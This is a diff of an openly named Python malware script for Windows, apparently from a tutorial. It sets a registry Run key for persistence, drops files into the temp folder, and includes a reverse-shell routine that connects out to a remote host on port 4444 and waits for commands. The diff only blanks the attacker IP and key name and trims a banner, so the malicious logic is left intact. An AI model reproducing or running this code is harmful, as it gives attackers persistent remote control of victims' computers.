@@ -13,8 +13,8 @@ from _winreg import *
 MALWARE_NAME = "malware.exe"
 TRIGGER = MALWARE_NAME.replace('.exe','')+".vbs"
 KEY_PATH = "Software\Microsoft\Windows\CurrentVersion\Run"
-KEY_NAME = "anarc0der_key"
-REV_SHELL = "192.168.1.106"
+KEY_NAME = ""
+REV_SHELL = ""
 SHELL_PORT = 4444
 TRIGGER_PATH = tempfile.gettempdir()+"\\"+TRIGGER
 MALWARE_PATH = tempfile.gettempdir()+"\\"+MALWARE_NAME
@@ -59,7 +59,7 @@ class My_malware():
         """ Method of reverse shell in python """
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((REV_SHELL,SHELL_PORT))
-        s.send('\n\!/ anarc0der mlwr tutorial\n\n[*] If you need to finish, just type: quit\n[*] PRESS ENTER TO PROMPT\n\n')
+        s.send('\n\!/ If you need to finish, just type: quit\n[*] PRESS ENTER TO PROMPT\n\n')
         while True:
             data = s.recv(1024)
             if "quit" in data:
